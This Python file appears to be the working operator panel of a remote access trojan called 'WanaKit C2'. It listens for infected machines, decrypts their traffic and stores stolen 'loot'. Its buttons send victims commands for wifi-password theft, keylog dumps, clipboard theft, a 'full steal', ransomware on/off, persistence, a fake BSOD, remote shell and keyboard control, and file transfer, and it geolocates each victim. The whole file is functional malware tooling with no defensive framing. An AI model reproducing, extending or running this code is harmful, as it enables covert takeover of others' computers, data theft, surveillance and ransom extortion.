import os, sys, json, zlib, time, socket, struct, threading, queue, urllib.request
import tkinter as tk
from tkinter import ttk, simpledialog, filedialog, messagebox
from Crypto.Cipher import AES
from PIL import Image, ImageTk

HERE = os.path.dirname(os.path.abspath(__file__))
LOOT = os.path.join(HERE, "loot")
CMDFILE = os.path.join(HERE, "commands.json")
KEYS, CLIENTS, SHOTS, FLAGS = [], {}, {}, {}
LOCK = threading.RLock()
Q = queue.Queue()
RUN = True
PORT = 4444

BG, PANEL, PANEL2, EDGE = "#0a0e13", "#121a22", "#18222c", "#243040"
FG, MUT, ACC, GRN, RED, YEL, CYA = "#c9d1d9", "#6e7781", "#58a6ff", "#3fb950", "#f85149", "#d29922", "#39c5cf"

ACTIONS = {
    "Recon": [("info", "info"), ("procs", "processes"), ("installed", "installed apps"),
              ("services", "services"), ("netstat", "netstat"), ("env", "environment"),
              ("idle", "idle time"), ("ping", "ping"), ("wifi", "wifi passwords")],
    "Desktop": [("shot", "screenshot"), ("msg", "message box"), ("speak", "speak"),
                ("open", "open program"), ("wall", "set wallpaper"), ("monitor", "monitor off"),
                ("lock", "lock"), ("beep", "beep"), ("volume", "mute")],
    "Troll": [("volmax", "volume 100"), ("bsod", "fake bsod"), ("yt", "play yt music"),
              ("ytstop", "stop yt music")],
    "Spy": [("keys", "keylog dump"), ("clip", "read clipboard"), ("setclip", "write clipboard"),
            ("steal", "full steal")],
    "Ransom": [("ransom", "ransomware ON"), ("unransom", "ransomware OFF")],
    "Lifecycle": [("persist", "persist on"), ("unpersist", "persist off"),
                  ("shutdown", "reboot"), ("exit", "exit"), ("kill", "kill")],
}
PROMPTS = {"msg": "message text", "speak": "text", "open": "path or url",
           "wall": "image path", "setclip": "text", "bsod": "seconds",
           "yt": "youtube url", "killpid": "pid", "killname": "process.exe"}


def load_keys():
    for f in (os.path.join(HERE, "output", "psk.txt"), os.path.join(HERE, "psk.txt"),
              os.path.join(HERE, "server_psk.txt")):
        try:
            if os.path.isfile(f):
                k = bytes.fromhex(open(f).read().strip())
                if k not in KEYS:
                    KEYS.append(k)
        except Exception:
            pass
    if not KEYS:
        k = os.urandom(32)
        KEYS.append(k)
        open(os.path.join(HERE, "server_psk.txt"), "w").write(k.hex())


def load_cmds():
    try:
        return json.load(open(CMDFILE))
    except Exception:
        return []


def save_cmds(c):
    json.dump(c, open(CMDFILE, "w"), indent=1)


def geo(ip):
    try:
        d = json.load(urllib.request.urlopen(
            "http://ip-api.com/json/%s?fields=status,country,countryCode" % ip, timeout=6))
        if d.get("status") == "success":
            return d.get("country", ""), d.get("countryCode", "")
    except Exception:
        pass
    return "", ""


def enc(key, data):
    n = os.urandom(12)
    c = AES.new(key, AES.MODE_GCM, nonce=n)
    ct, tag = c.encrypt_and_digest(zlib.compress(data, 6))
    return struct.pack(">I", len(n) + len(ct) + 16) + n + ct + tag


def recvn(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError
        b += c
    return b


def sock_send(c, hdr, blob=b""):
    c["sock"].sendall(enc(c["key"], json.dumps(hdr).encode() + b"\n" + blob))


def read(s):
    ln = struct.unpack(">I", recvn(s, 4))[0]
    d = recvn(s, ln)
    for k in KEYS:
        try:
            c = AES.new(k, AES.MODE_GCM, nonce=d[:12])
            raw = zlib.decompress(c.decrypt_and_verify(d[12:-16], d[-16:]))
            h, _, blob = raw.partition(b"\n")
            return json.loads(h), blob, k
        except Exception:
            continue
    raise ValueError("no psk")


def save(cid, name, blob):
    d = os.path.join(LOOT, cid)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, str(int(time.time())) + "_" + name)
    open(p, "wb").write(blob)
    return p


def handle(sock, addr):
    cid = None
    try:
        while RUN:
            hdr, blob, key = read(sock)
            t = hdr.get("t")
            if t in ("hello", "hb"):
                cid = hdr.get("id")
                with LOCK:
                    old = CLIENTS.get(cid)
                    if old and old.get("sock") is not sock:
                        try:
                            old["sock"].close()
                        except Exception:
                            pass
                    CLIENTS[cid] = {"sock": sock, "addr": addr, "h": hdr,
                                    "seen": time.time(), "key": key, "on": True}
                if t == "hello":
                    Q.put(("new", cid, hdr))
            elif cid is None:
                continue
            elif t == "shot":
                save(cid, "shot.jpg", blob)
                Q.put(("shot", cid, blob))
            elif t == "steal":
                p = save(cid, hdr.get("name", "loot.zip"), blob)
                Q.put(("log", cid, "steal -> " + p))
            elif t == "dl":
                p = save(cid, hdr.get("name", "file.bin"), blob)
                Q.put(("log", cid, "download -> " + p))
            elif t in ("shell", "ps", "info", "ls", "find", "hash", "env", "services",
                       "netstat", "installed", "wifi", "keys", "clip", "win"):
                Q.put(("text", cid, (t, blob.decode("utf-8", "replace"))))
            elif t == "procs":
                save(cid, "procs.csv", blob)
                Q.put(("text", cid, ("procs", blob.decode("utf-8", "replace"))))
            elif t == "persist":
                Q.put(("log", cid, "persist " + str(hdr.get("res"))))
            elif t == "ransom":
                Q.put(("log", cid, "ransom " + ("ON" if hdr.get("on") else "OFF")))
            elif t == "ack":
                Q.put(("log", cid, hdr.get("arg", "")))
            elif t == "pong":
                Q.put(("log", cid, "pong"))
            elif t == "bye":
                Q.put(("log", cid, "exited"))
            elif t == "err":
                Q.put(("log", cid, "ERROR " + str(hdr.get("e"))))
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
        if cid:
            Q.put(("gone", cid, None))


def bind_any(p0):
    for p in [p0] + [p0 + i for i in range(1, 10)]:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", p))
            s.listen(50)
            return s, p
        except Exception:
            try:
                s.close()
            except Exception:
                pass
    raise OSError("no free port")


def listener():
    global PORT
    try:
        srv, PORT = bind_any(PORT)
    except Exception as e:
        Q.put(("state", None, ("FAIL", str(e))))
        return
    Q.put(("state", None, ("UP", PORT)))
    while RUN:
        try:
            s, a = srv.accept()
        except Exception:
            break
        threading.Thread(target=handle, args=(s, a), daemon=True).start()


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WanaKit C2")
        self.geometry("1440x880")
        self.configure(bg=BG)
        self.hist, self.hpos = [], 0
        self.mode = tk.StringVar(value="ps")
        self.shot_show = True
        self.cur_shot = None
        self._style()
        self._layout()
        self.refresh_custom()
        self.after(120, self._drain)
        self.after(1000, self._tick)
        threading.Thread(target=listener, daemon=True).start()

    def _style(self):
        s = ttk.Style(self)
        s.theme_use("clam")
        s.configure(".", background=BG, foreground=FG, fieldbackground=PANEL2)
        s.configure("TFrame", background=BG)
        s.configure("TButton", background=PANEL2, foreground=FG, padding=5, borderwidth=0)
        s.map("TButton", background=[("active", EDGE)])
        s.configure("Treeview", background=PANEL2, fieldbackground=PANEL2, foreground=FG, rowheight=22, borderwidth=0)
        s.configure("Treeview.Heading", background=PANEL, foreground=ACC)
        s.configure("TNotebook", background=BG, borderwidth=0)
        s.configure("TNotebook.Tab", background=PANEL2, foreground=MUT, padding=(14, 6))
        s.map("TNotebook.Tab", background=[("selected", PANEL)], foreground=[("selected", ACC)])

    def _layout(self):
        top = tk.Frame(self, bg=PANEL, height=54)
        top.pack(fill="x")
        tk.Label(top, text=" WanaKit C2", bg=PANEL, fg=ACC,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=10, pady=10)
        self.lbl = tk.Label(top, text="starting...", bg=PANEL, fg=YEL, font=("Consolas", 9))
        self.lbl.pack(side="right", padx=12)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=8, pady=6)
        left = tk.Frame(body, bg=PANEL, width=520)
        left.pack(side="left", fill="both", padx=(0, 8))
        left.pack_propagate(False)
        bar = tk.Frame(left, bg=PANEL)
        bar.pack(fill="x", padx=8, pady=(8, 4))
        tk.Label(bar, text="MACHINES", bg=PANEL, fg=ACC,
                 font=("Segoe UI Semibold", 10)).pack(side="left")
        ttk.Button(bar, text="remove", width=7, command=self.remove).pack(side="right", padx=2)
        ttk.Button(bar, text="clear off", width=8, command=self.clear_off).pack(side="right", padx=2)
        cols = ("st", "host", "user", "adm", "ip", "ctry", "seen")
        self.tree = ttk.Treeview(left, columns=cols, show="tree headings",
                                 selectmode="extended", height=20)
        self.tree.column("#0", width=40, stretch=False)
        self.tree.heading("#0", text="")
        for c, w in (("st", 30), ("host", 110), ("user", 85), ("adm", 34), ("ip", 100),
                     ("ctry", 90), ("seen", 42)):
            self.tree.heading(c, text=c)
            self.tree.column(c, width=w, anchor="w")
        self.tree.tag_configure("off", foreground=MUT)
        self.tree.tag_configure("on", foreground=GRN)
        self.tree.pack(fill="both", expand=True, padx=8)
        self.tree.bind("<<TreeviewSelect>>", self._on_pick)

        sb = ttk.Scrollbar(left, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        sb.pack(side="bottom", fill="x", padx=8, pady=(0, 8))

        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)
        self.nb = ttk.Notebook(right)
        self.nb.pack(fill="both", expand=True)
        self._tab_term()
        self._tab_files()
        self._tab_shots()
        self._tab_actions()
        self._tab_custom()
        self._tab_log()

    def _tab_term(self):
        tab = tk.Frame(self.nb, bg="#05080b")
        self.nb.add(tab, text="Terminal")
        head = tk.Frame(tab, bg="#05080b")
        head.pack(fill="x", padx=8, pady=(6, 0))
        for v, t in (("ps", "powershell"), ("cmd", "cmd")):
            tk.Radiobutton(head, text=t, variable=self.mode, value=v, bg="#05080b", fg=CYA,
                           selectcolor="#05080b", activebackground="#05080b",
                           activeforeground=CYA, font=("Consolas", 9), bd=0,
                           highlightthickness=0).pack(side="left", padx=4)
        ttk.Button(head, text="clear", width=7, command=self.term_clear).pack(side="right")
        ttk.Button(head, text="remote keyboard", command=self.kbd_win).pack(side="right", padx=4)
        self.term = tk.Text(tab, bg="#05080b", fg="#c8e6c9", font=("Consolas", 10), bd=0,
                            highlightthickness=0, wrap="word")
        self.term.pack(fill="both", expand=True, padx=8, pady=4)
        self.term.tag_config("echo", foreground=CYA)
        self.term.tag_config("err", foreground=RED)
        self.term.tag_config("ok", foreground=GRN)
        self.term.bind("<Control-l>", lambda e: self.term_clear())
        row = tk.Frame(tab, bg="#05080b")
        row.pack(fill="x", padx=8, pady=(0, 8))
        tk.Label(row, text=">", bg="#05080b", fg=GRN, font=("Consolas", 10, "bold")).pack(side="left")
        self.term_in = tk.Entry(row, bg="#05080b", fg="#e6ffe6", insertbackground="#e6ffe6",
                                font=("Consolas", 10), relief="flat", bd=0)
        self.term_in.pack(side="left", fill="x", expand=True, padx=6)
        self.term_in.bind("<Return>", self.term_send)
        self.term_in.bind("<Up>", lambda e: self.hist_move(-1))
        self.term_in.bind("<Down>", lambda e: self.hist_move(1))

    def _tab_files(self):
        tab = tk.Frame(self.nb, bg=PANEL)
        self.nb.add(tab, text="Files")
        head = tk.Frame(tab, bg=PANEL)
        head.pack(fill="x", padx=8, pady=6)
        self.path = tk.Entry(head, bg=PANEL2, fg=FG, insertbackground=FG,
                             font=("Consolas", 9), relief="flat", bd=4)
        self.path.pack(side="left", fill="x", expand=True)
        self.path.insert(0, "C:\\")
        self.path.bind("<Return>", lambda e: self.do_ls())
        for t, c in (("go", self.do_ls), ("up", self.do_up), ("download", self.do_dl),
                     ("upload", self.do_ul),
                     ("newdir", lambda: self.do_simple("mkdir", "full path")),
                     ("delete", lambda: self.do_simple("rm", "full path")),
                     ("zip", lambda: self.do_simple("zip", "folder"))):
            ttk.Button(head, text=t, command=c).pack(side="left", padx=2)
        wrap = tk.Frame(tab, bg=PANEL)
        wrap.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.files = ttk.Treeview(wrap, columns=("size", "name"), show="headings", height=20)
        self.files.heading("size", text="size")
        self.files.heading("name", text="name")
        self.files.column("size", width=90, anchor="e")
        self.files.column("name", width=460, anchor="w")
        fsb = ttk.Scrollbar(wrap, orient="vertical", command=self.files.yview)
        self.files.configure(yscrollcommand=fsb.set)
        self.files.pack(side="left", fill="both", expand=True)
        fsb.pack(side="right", fill="y")
        self.files.bind("<Double-1>", self.file_open)

    def _tab_shots(self):
        tab = tk.Frame(self.nb, bg=PANEL)
        self.nb.add(tab, text="Screenshots")
        head = tk.Frame(tab, bg=PANEL)
        head.pack(fill="x", padx=8, pady=6)
        tk.Label(head, text="captured screens", bg=PANEL, fg=MUT, font=("Consolas", 9)).pack(side="left")
        ttk.Button(head, text="hide images", command=self.toggle_shots).pack(side="right")
        ttk.Button(head, text="grab now", command=lambda: self.do_action("shot", "screenshot")).pack(side="right", padx=4)
        self.shot_list = tk.Listbox(tab, height=6, bg=PANEL2, fg=FG, font=("Consolas", 9),
                                    bd=0, highlightthickness=0)
        self.shot_list.pack(fill="x", padx=8)
        self.shot_list.bind("<<ListboxSelect>>", self.show_shot)
        self.shot_frame = tk.Frame(tab, bg="#05080b")
        self.shot_frame.pack(fill="both", expand=True, padx=8, pady=8)
        self.shot_lbl = tk.Label(self.shot_frame, bg="#05080b", fg=MUT, text="no image")
        self.shot_lbl.pack(fill="both", expand=True)

    def _tab_actions(self):
        tab = tk.Frame(self.nb, bg=PANEL)
        self.nb.add(tab, text="Actions")
        for g, items in ACTIONS.items():
            box = tk.Frame(tab, bg=PANEL)
            box.pack(fill="x", padx=10, pady=3)
            tk.Label(box, text=g.upper(), bg=PANEL, fg=MUT,
                     font=("Segoe UI Semibold", 9)).pack(anchor="w")
            row = tk.Frame(box, bg=PANEL)
            row.pack(fill="x")
            for i, (v, lb) in enumerate(items):
                ttk.Button(row, text=lb, width=17,
                           command=lambda a=v, b=lb: self.do_action(a, b)
                           ).grid(row=i // 5, column=i % 5, padx=2, pady=2, sticky="w")
        box = tk.Frame(tab, bg=PANEL)
        box.pack(fill="x", padx=10, pady=3)
        tk.Label(box, text="DANGER", bg=PANEL, fg=RED, font=("Segoe UI Semibold", 9)).pack(anchor="w")
        ttk.Button(box, text="SELF DESTRUCT", command=self.destruct).pack(anchor="w", pady=2)

    def _tab_custom(self):
        tab = tk.Frame(self.nb, bg=PANEL)
        self.nb.add(tab, text="Custom")
        head = tk.Frame(tab, bg=PANEL)
        head.pack(fill="x", padx=10, pady=6)
        ttk.Button(head, text="+ Add Command", command=self.add_cmd).pack(side="left")
        ttk.Button(head, text="remove selected", command=self.del_cmd).pack(side="left", padx=6)
        self.cmd_box = tk.Frame(tab, bg=PANEL)
        self.cmd_box.pack(fill="both", expand=True, padx=10, pady=4)
        self.cmd_buttons = []

    def _tab_log(self):
        tab = tk.Frame(self.nb, bg=PANEL)
        self.nb.add(tab, text="Log")
        head = tk.Frame(tab, bg=PANEL)
        head.pack(fill="x", padx=8, pady=4)
        ttk.Button(head, text="open loot", command=self.open_loot).pack(side="right")
        ttk.Button(head, text="clear", command=lambda: self.txt.delete("1.0", "end")).pack(side="right", padx=4)
        self.txt = tk.Text(tab, bg="#05080b", fg=FG, font=("Consolas", 9), bd=0,
                           highlightthickness=0, wrap="word")
        self.txt.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        for tag, col in (("ok", GRN), ("err", RED), ("warn", YEL), ("info", ACC), ("dim", MUT)):
            self.txt.tag_config(tag, foreground=col)

    # ---- helpers
    def open_loot(self):
        os.makedirs(LOOT, exist_ok=True)
        os.startfile(LOOT)

    def current(self):
        s = self.tree.selection()
        return s[0] if s else None

    def _on_pick(self, _e=None):
        cid = self.current()
        c = CLIENTS.get(cid) if cid else None
        if c:
            self.path.delete(0, "end")
            self.path.insert(0, "C:\\Users\\" + c["h"].get("u", "user"))
            self.do_ls()
            self.load_shots(cid)

    def remove(self):
        for i in self.tree.selection():
            self.tree.delete(i)
            with LOCK:
                CLIENTS.pop(i, None)
            SHOTS.pop(i, None)
        self.note("removed", "info")

    def clear_off(self):
        n = 0
        for i in list(self.tree.get_children()):
            c = CLIENTS.get(i)
            if not c or time.time() - c["seen"] > 45:
                self.tree.delete(i)
                with LOCK:
                    CLIENTS.pop(i, None)
                n += 1
        self.note("cleared %d" % n, "info")

    def note(self, m, k="dim"):
        self.txt.insert("end", time.strftime("[%H:%M:%S] ") + str(m) + "\n", k)
        self.txt.see("end")

    def term_echo(self, t, k="dim"):
        self.term.insert("end", t, k)
        self.term.see("end")

    def term_clear(self):
        self.term.delete("1.0", "end")

    def hist_move(self, d):
        if not self.hist:
            return
        self.hpos = max(0, min(len(self.hist), self.hpos + d))
        self.term_in.delete(0, "end")
        if self.hpos < len(self.hist):
            self.term_in.insert(0, self.hist[len(self.hist) - 1 - self.hpos])

    def term_send(self, _e=None):
        cid = self.current()
        if not cid or cid not in CLIENTS:
            self.term_echo("\nno machine selected\n", "err")
            return
        cmd = self.term_in.get()
        self.term_in.delete(0, "end")
        if not cmd.strip():
            return
        self.hist.append(cmd)
        self.hpos = 0
        v = self.mode.get()
        self.term_echo("\n" + ("PS> " if v == "ps" else ">") + cmd + "\n", "echo")
        try:
            sock_send(CLIENTS[cid], {"t": v, "arg": cmd})
        except Exception as e:
            self.term_echo(str(e) + "\n", "err")

    def kbd_win(self):
        cid = self.current()
        if not cid or cid not in CLIENTS:
            self.note("select a machine", "warn")
            return
        c = CLIENTS[cid]
        w = tk.Toplevel(self)
        w.title("remote keyboard - ESC to detach")
        w.geometry("560x160")
        w.configure(bg="#05080b")
        tk.Label(w, text="every key goes to the victim.\nESC detaches.", bg="#05080b", fg=CYA,
                 font=("Consolas", 11)).pack(pady=14)
        box = tk.Text(w, height=2, bg="#05080b", fg=GRN, font=("Consolas", 14), bd=0)
        box.pack(fill="both", expand=True)
        sock_send(c, {"t": "kbd"})

        def key(e):
            if e.keycode == 27:
                sock_send(c, {"t": "kbdstop"})
                w.destroy()
                return
            sock_send(c, {"t": "kbdkey", "arg": str(e.keycode)})
            box.insert("end", e.char or "")
            box.see("end")
        w.bind("<KeyPress>", key)
        w.focus_force()

    def do_action(self, v, lb):
        sel = self.tree.selection()
        if not sel:
            self.note("select a machine", "warn")
            return
        arg = ""
        if v in PROMPTS:
            arg = simpledialog.askstring("argument", PROMPTS[v] + ":", parent=self) or ""
            if not arg:
                return
        for i in sel:
            c = CLIENTS.get(i)
            if c:
                try:
                    sock_send(c, {"t": v, "arg": arg})
                except Exception as e:
                    self.note(str(e), "err")
        self.note("%s -> %d%s" % (lb, len(sel), (" [" + arg[:40] + "]") if arg else ""), "info")

    def destruct(self):
        sel = self.tree.selection()
        if not sel:
            return
        if not messagebox.askyesno("self destruct",
                                   "Remove persistence, delete the appdata folder and exit on "
                                   "%d machine(s)?" % len(sel)):
            return
        for i in sel:
            c = CLIENTS.get(i)
            if c:
                sock_send(c, {"t": "selfdestruct"})
        self.note("self destruct sent", "warn")

    def do_ls(self):
        cid = self.current()
        if cid and cid in CLIENTS:
            sock_send(CLIENTS[cid], {"t": "ls", "arg": self.path.get()})

    def do_up(self):
        p = self.path.get().rstrip("\\")
        if len(p) <= 2:
            return
        self.path.delete(0, "end")
        self.path.insert(0, p[:p.rfind("\\")] or "C:\\")
        self.do_ls()

    def do_dl(self):
        self.do_simple("dl", "full path")

    def do_ul(self):
        cid = self.current()
        if not cid or cid not in CLIENTS:
            return
        p = filedialog.askopenfilename(parent=self)
        if not p:
            return
        t = simpledialog.askstring("upload", "destination path:", parent=self)
        if not t:
            return
        sock_send(CLIENTS[cid], {"t": "ul", "arg": t}, open(p, "rb").read())
        self.note("uploaded -> " + t, "info")

    def do_simple(self, v, prompt):
        cid = self.current()
        if not cid or cid not in CLIENTS:
            self.note("select a machine", "warn")
            return
        a = simpledialog.askstring("argument", prompt + ":", initialvalue=self.path.get(), parent=self)
        if not a:
            return
        sock_send(CLIENTS[cid], {"t": v, "arg": a})
        self.note(v + " " + a, "info")

    def file_open(self, _e=None):
        s = self.files.selection()
        if not s:
            return
        size, name = self.files.item(s[0], "values")
        full = self.path.get().rstrip("\\") + "\\" + name
        if size == "<DIR>":
            self.path.delete(0, "end")
            self.path.insert(0, full)
            self.do_ls()
        else:
            cid = self.current()
            if cid and cid in CLIENTS:
                sock_send(CLIENTS[cid], {"t": "dl", "arg": full})
                self.note("download " + full, "info")

    def fill_files(self, body):
        self.files.delete(*self.files.get_children())
        for line in body.splitlines():
            line = line.rstrip()
            if not line or line.startswith("(empty"):
                continue
            if line.startswith("<DIR>"):
                self.files.insert("", "end", values=("<DIR>", line[5:].strip()))
            else:
                p = line.split(None, 1)
                if len(p) == 2 and p[0].isdigit():
                    self.files.insert("", "end", values=(p[0], p[1]))
                else:
                    self.files.insert("", "end", values=("", line))

    # ---- shots
    def toggle_shots(self):
        self.shot_show = not self.shot_show
        if self.shot_show:
            self.shot_frame.pack(fill="both", expand=True, padx=8, pady=8)
        else:
            self.shot_frame.pack_forget()

    def load_shots(self, cid):
        self.shot_list.delete(0, "end")
        for ts, _ in SHOTS.get(cid, []):
            self.shot_list.insert("end", time.strftime("%H:%M:%S", time.localtime(ts)))

    def show_shot(self, _e=None):
        cid = self.current()
        s = self.shot_list.curselection()
        if not cid or not s:
            return
        try:
            blob = SHOTS[cid][s[0]][1]
            im = Image.open(__import__("io").BytesIO(blob))
            im.thumbnail((900, 520))
            ph = ImageTk.PhotoImage(im)
            self.shot_lbl.config(image=ph, text="")
            self.shot_lbl.image = ph
        except Exception as e:
            self.shot_lbl.config(text=str(e), image="")

    # ---- custom commands
    def refresh_custom(self):
        for b in self.cmd_buttons:
            b.destroy()
        self.cmd_buttons = []
        for i, c in enumerate(load_cmds()):
            b = ttk.Button(self.cmd_box, text=c["name"], width=24,
                           command=lambda k=i: self.run_custom(k))
            b.grid(row=i // 4, column=i % 4, padx=3, pady=3, sticky="w")
            self.cmd_buttons.append(b)

    def run_custom(self, i):
        c = load_cmds()[i]
        sel = self.tree.selection()
        if not sel:
            self.note("select a machine", "warn")
            return
        for iid in sel:
            cl = CLIENTS.get(iid)
            if cl:
                sock_send(cl, {"t": c["type"], "arg": c["cmd"]})
        self.note("custom '%s' -> %d" % (c["name"], len(sel)), "info")

    def add_cmd(self):
        w = tk.Toplevel(self)
        w.title("add command")
        w.configure(bg=PANEL)
        w.geometry("420x220")
        tk.Label(w, text="name", bg=PANEL, fg=FG).pack(anchor="w", padx=10, pady=(10, 0))
        e1 = tk.Entry(w, bg=PANEL2, fg=FG, insertbackground=FG)
        e1.pack(fill="x", padx=10)
        tk.Label(w, text="type", bg=PANEL, fg=FG).pack(anchor="w", padx=10, pady=(8, 0))
        v = tk.StringVar(value="cmd")
        f = tk.Frame(w, bg=PANEL)
        f.pack(anchor="w", padx=10)
        for t in ("cmd", "ps"):
            tk.Radiobutton(f, text=t, variable=v, value=t, bg=PANEL, fg=FG, selectcolor=PANEL2,
                           activebackground=PANEL).pack(side="left")
        tk.Label(w, text="command", bg=PANEL, fg=FG).pack(anchor="w", padx=10, pady=(8, 0))
        e2 = tk.Entry(w, bg=PANEL2, fg=FG, insertbackground=FG)
        e2.pack(fill="x", padx=10)

        def ok():
            n, c = e1.get().strip(), e2.get().strip()
            if not n or not c:
                return
            d = load_cmds()
            d.append({"name": n, "type": v.get(), "cmd": c})
            save_cmds(d)
            self.refresh_custom()
            w.destroy()
        ttk.Button(w, text="save", command=ok).pack(pady=10)

    def del_cmd(self):
        d = load_cmds()
        names = [x["name"] for x in d]
        if not names:
            return
        n = simpledialog.askstring("remove", "name to remove:\n" + ", ".join(names), parent=self)
        if not n:
            return
        save_cmds([x for x in d if x["name"] != n])
        self.refresh_custom()

    # ---- queue
    def _drain(self):
        try:
            while True:
                try:
                    item = Q.get_nowait()
                except queue.Empty:
                    break
                k, cid, p = item
                if k == "log":
                    self.note((cid[:8] + " " if cid else "") + str(p),
                              "err" if "ERROR" in str(p) else "dim")
                elif k == "state":
                    m, i = p
                    if m == "UP":
                        self.lbl.config(text="LISTENING :%d" % i, fg=GRN)
                        self.note("listening on %d" % i, "ok")
                    else:
                        self.lbl.config(text="BIND FAILED", fg=RED)
                        self.note(str(i), "err")
                elif k == "new":
                    h = p
                    if self.tree.exists(cid):
                        self.tree.delete(cid)
                    self.tree.insert("", "end", iid=cid, tags=("on",), text="",
                                     values=("ON", h.get("h", "?"), h.get("u", "?"),
                                             "Y" if h.get("adm") else "-", h.get("ip", "?"), "", "0s"))
                    self.note("NEW %s %s/%s %s" % (cid[:8], h.get("h"), h.get("u"), h.get("ip")), "ok")
                    self.term_echo("\n[%s connected]\n" % cid[:8], "ok")
                    threading.Thread(target=self._flag, args=(cid, h.get("wan", "")), daemon=True).start()
                elif k == "gone":
                    if self.tree.exists(cid):
                        self.tree.set(cid, "st", "OFF")
                        self.tree.item(cid, tags=("off",))
                    self.note(cid[:8] + " offline", "warn")
                elif k == "shot":
                    SHOTS.setdefault(cid, []).append((time.time(), p))
                    del SHOTS[cid][:-30]
                    if cid == self.current():
                        self.load_shots(cid)
                    self.note(cid[:8] + " screenshot", "info")
                elif k == "text":
                    v, body = p
                    if v == "ls":
                        self.fill_files(body)
                    elif v in ("shell", "ps"):
                        self.term_echo(body + ("" if body.endswith("\n") else "\n"))
                    elif v == "procs":
                        self.term_echo("\n--- processes ---\n" + body[:8000] + "\n")
                    else:
                        self.term_echo("\n--- %s ---\n%s\n" % (v, body[:6000]), "dim")
        except Exception as e:
            self.note("drain " + repr(e), "err")
        finally:
            self.after(120, self._drain)

    def _flag(self, cid, ip):
        if not ip:
            return
        name, cc = geo(ip)
        if not name:
            return
        try:
            if cc not in FLAGS:
                raw = urllib.request.urlopen("https://flagcdn.com/w20/%s.png" % cc.lower(), timeout=8).read()
                FLAGS[cc] = ImageTk.PhotoImage(Image.open(__import__("io").BytesIO(raw)))
            if self.tree.exists(cid):
                self.tree.set(cid, "ctry", "%s %s" % (cc, name))
                self.tree.item(cid, image=FLAGS[cc])
        except Exception:
            if self.tree.exists(cid):
                self.tree.set(cid, "ctry", name)

    def _tick(self):
        try:
            now = time.time()
            for i in list(self.tree.get_children()):
                c = CLIENTS.get(i)
                if not c:
                    continue
                a = int(now - c["seen"])
                self.tree.set(i, "seen", "%ds" % a)
                if a > 45 and c.get("on"):
                    c["on"] = False
                    self.tree.set(i, "st", "OFF")
                    self.tree.item(i, tags=("off",))
                elif a <= 45 and not c.get("on"):
                    c["on"] = True
                    self.tree.set(i, "st", "ON")
                    self.tree.item(i, tags=("on",))
            on = sum(1 for i in self.tree.get_children() if CLIENTS.get(i, {}).get("on"))
            if self.lbl.cget("fg") != RED:
                self.lbl.config(text="port %d | %d online | %d known"
                                % (PORT, on, len(self.tree.get_children())))
        except Exception:
            pass
        finally:
            self.after(1000, self._tick)


def main():
    global PORT
    if "--port" in sys.argv:
        try:
            PORT = int(sys.argv[sys.argv.index("--port") + 1])
        except Exception:
            pass
    load_keys()
    os.makedirs(LOOT, exist_ok=True)
    App().mainloop()


if __name__ == "__main__":
    main()